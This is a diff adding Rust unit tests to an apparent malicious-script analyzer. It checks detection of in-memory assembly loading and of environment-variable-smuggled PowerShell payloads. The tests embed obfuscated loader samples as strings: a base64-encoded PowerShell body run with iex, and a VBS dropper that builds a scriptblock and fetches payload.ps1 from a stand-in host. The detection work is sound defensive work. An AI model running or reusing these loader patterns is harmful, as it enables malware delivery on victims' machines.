@@ -2582,6 +2582,27 @@ move "%cmdDestination%" "%startupFolder%"
     }
 
     #[test]
+    fn appdomain_inmem_assembly_load_detected_in_extracted_ps_payload() {
+        // Some PS loaders avoid `[Reflection.Assembly]::Load` and call the
+        // equivalent AppDomain loader after building a byte array.
+        let body = "$payload=[byte[]](77,90,0,0); [System.AppDomain]::CurrentDomain.Load($payload)";
+        use base64::Engine as _;
+        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::InMemoryAssemblyLoad { variant } if variant == "AppDomain.Load"
+            )),
+            "AppDomain InMemoryAssemblyLoad not detected: traits={:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn escaped_ampersand_inmem_load_text_does_not_emit_assembly_load_trait() {
         let script = br#"echo keep ^& powershell [System.Reflection.Assembly]::Load($bytes)"#;
         let report = analyze(script, &AnalyzeConfig::default());
@@ -21168,6 +21189,51 @@ sh.Exec "mshta vbs-exec.example/payload.hta""#;
             )),
             "no Download trait from VBS WScript.Shell.Exec schemeless URL: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn analyze_vbs_env_scriptblock_payload_is_scanned_as_ps() {
+        let url = "https://vbs-env-analyze.example/payload.ps1";
+        let ps = "Invoke-WebRequest -Uri $env:STAGE_URL";
+        let nums = ps
+            .bytes()
+            .map(|byte| byte.to_string())
+            .collect::<Vec<_>>()
+            .join(", ");
+        let vbs = format!(
+            r#"Dim sh, proc_env, payload, values, pair, i
+values = Array({nums})
+pair = Array("STAGE_URL", "{url}")
+payload = ""
+For i = 0 To UBound(values)
+    payload = payload & Chr(values(i))
+Next
+Set sh = CreateObject("WScript.Shell")
+Set proc_env = sh.Environment("Process")
+proc_env(pair(0)) = pair(1)
+proc_env("PAYLOAD") = payload
+sh.Run "powershell -Command ""&([scriptblock]::Create($env:PAYLOAD))""", 0, False"#
+        );
+
+        let report = analyze(vbs.as_bytes(), &Config::default());
+
+        assert!(
+            report.extracted_ps1.iter().any(|payload| {
+                String::from_utf8_lossy(payload)
+                    .contains("https://vbs-env-analyze.example/payload.ps1")
+            }),
+            "VBS env-backed scriptblock payload was not extracted: {:?}",
+            report.extracted_ps1
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://vbs-env-analyze.example/payload.ps1"
+            )),
+            "VBS env-backed scriptblock payload was not scanned as PS: {:?}",
+            report.traits
         );
     }
 
